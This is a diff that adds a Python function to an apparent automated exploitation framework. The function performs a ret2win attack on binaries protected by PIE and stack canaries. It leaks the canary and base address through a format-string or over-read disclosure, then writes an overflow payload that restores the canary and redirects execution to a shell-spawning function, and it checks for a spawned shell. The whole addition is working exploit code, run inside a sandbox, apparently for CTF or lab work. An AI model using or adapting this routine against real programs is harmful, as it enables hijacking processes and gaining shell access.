@@ -1081,6 +1081,100 @@ def canary_ret2libc(exe, workdir, *, offset, canary_offset, ret_offset, canary_t
                                    "(offsets/leak slot?)"}
 
 
+def canary_pie_ret2win(exe, workdir, *, canary_trigger, canary_offset, ret_offset, win_off,
+                       target_bytes, canary_index=None, canary_regex: str = r"0x[0-9a-fA-F]+",
+                       loop_feed: bytes = None, base_argv=(), marker: bytes = b"LYKOS-PCW-9931",
+                       timeout: float = 8.0, mem_mb: int = 2048) -> dict:
+    """ret2win on a PIE + stack-canary target with an in-binary win (a function that spawns a shell
+    / prints the flag). Both the canary AND the PIE base are random per process, so BOTH are leaked
+    IN THE SAME PROCESS as the overflow: `canary_trigger` discloses them (a format `%p` dump or a
+    `printf("%s", buf)` over-read that runs into the canary and the saved return into image code);
+    `rop.find_canary` picks the canary and `exploit.recover_pie_base` pins the base from >=2
+    corroborating image pointers. The overflow then writes the leaked canary back
+    (`build_canary_prefix`) and returns to `win_off + pie_base`. Confirmed by a spawned shell
+    echoing `marker` (a win that execve's a shell) OR the win's own output containing the marker.
+    Returns {ok, canary, pie_base, win} or {ok: False, reason}."""
+    import re as _re
+    import struct as _struct
+
+    from . import exploit as _exploit
+    from . import rop
+    rx = _re.compile(canary_regex.encode("latin-1"))
+    q = lambda v: _struct.pack("<Q", v & 0xFFFFFFFFFFFFFFFF)      # noqa: E731
+    feed = canary_trigger if loop_feed is None else loop_feed
+    exedir = str(Path(exe).resolve().parent)
+    argv = [str(a) for a in base_argv]
+
+    def _leak(p):
+        try:
+            p.stdin.write(canary_trigger)
+            p.stdin.flush()
+        except (BrokenPipeError, OSError):
+            return None, None
+        dump = _read_until(p, time.time() + timeout / 2)
+        vals = [int(m.group(0), 16) for m in rx.finditer(dump) if _allint(m.group(0))]
+        vals += _le_pointer_words(dump)
+        cvals = list(vals) + _le_canary_words(dump)
+        canary = (cvals[canary_index] if canary_index is not None
+                  and -len(cvals) <= canary_index < len(cvals) else rop.find_canary(cvals))
+        pie_base = _exploit.recover_pie_base(vals, target_bytes)
+        return canary, pie_base
+
+    # A PIE target with a relative loader must run with the sandbox cwd in its staged dir.
+    rel = sandbox._relative_interp(str(exe)) if hasattr(sandbox, "_relative_interp") else False
+    for align in (False, True):                                  # optional ret-slide for alignment
+        for _ in range(3):
+            preexec = sandbox._rlimits(mem_mb, int(timeout) + 2, set_as=True)
+            cmd = sandbox.isolate_prefix(exedir, net=False, rw_binds=[exedir],
+                                         chdir=(exedir if rel else "")) + [str(exe)] + argv
+            try:
+                p = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
+                                     stderr=subprocess.STDOUT, cwd=exedir,
+                                     start_new_session=True, preexec_fn=preexec)
+            except Exception as e:                               # noqa: BLE001
+                return {"ok": False, "reason": f"spawn failed: {e!r}"}
+            try:
+                _read_until(p, time.time() + 0.5)
+                canary, pie_base = _leak(p)
+                if canary is None or not pie_base:
+                    continue                                     # need BOTH in this process
+                pre = rop.build_canary_prefix(canary_offset, canary, ret_offset)
+                payload = bytearray(pre)
+                if align:                                        # a lone `ret` to fix 16-byte align
+                    r = rop.find_gadget(target_bytes, "ret")
+                    if r:
+                        payload += q(pie_base + r)
+                payload += q(pie_base + int(win_off))
+                try:
+                    p.stdin.write(bytes(payload))
+                    p.stdin.flush()
+                    # re-entered read (if the overflow returns through a loop) then provoke output
+                    time.sleep(0.2)
+                    p.stdin.write(b"echo " + marker + b"\n")
+                    p.stdin.flush()
+                except (BrokenPipeError, OSError):
+                    continue
+                out = _read_until(p, time.time() + timeout, quiet=1.2)
+                if marker in out or b"/bin/sh" in out or b"$ " in out:
+                    return {"ok": True, "canary": canary, "pie_base": pie_base,
+                            "win": pie_base + int(win_off),
+                            "output": out[:400].decode("latin-1", "ignore")}
+            finally:
+                for s in (p.stdin, p.stdout):
+                    try:
+                        if s is not None:
+                            s.close()
+                    except Exception:                           # noqa: BLE001
+                        pass
+                _kill(p)
+                try:
+                    p.wait(timeout=2)
+                except Exception:                               # noqa: BLE001
+                    pass
+    return {"ok": False, "reason": "PIE+canary ret2win: leaked the canary but could not corroborate "
+                                   "a PIE base from the same leak, or the redirect did not confirm"}
+
+
 def _allint(b):
     try:
         int(b, 16)
